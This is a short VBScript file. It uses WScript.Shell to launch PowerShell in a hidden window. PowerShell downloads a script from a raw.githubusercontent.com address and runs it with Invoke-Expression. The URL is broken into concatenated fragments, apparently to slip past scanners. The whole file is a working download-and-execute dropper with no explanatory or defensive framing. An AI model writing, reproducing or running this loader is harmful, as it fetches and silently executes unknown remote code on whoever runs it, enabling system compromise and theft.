Option Explicit

Dim a1, a2, a3

Set a1 = CreateObject("WScript.Shell")

a2 = "powershell.exe -c ""$a3 = iwr h"+"t"+"tp://r"+"aw.g"+"ithubusercontent.com/k53xupn43/i965652f/refs/heads/main/m.ps1?dl=1; invoke-expression $a3"""
a1.Run a2, 0, True

Set a1 = Nothing
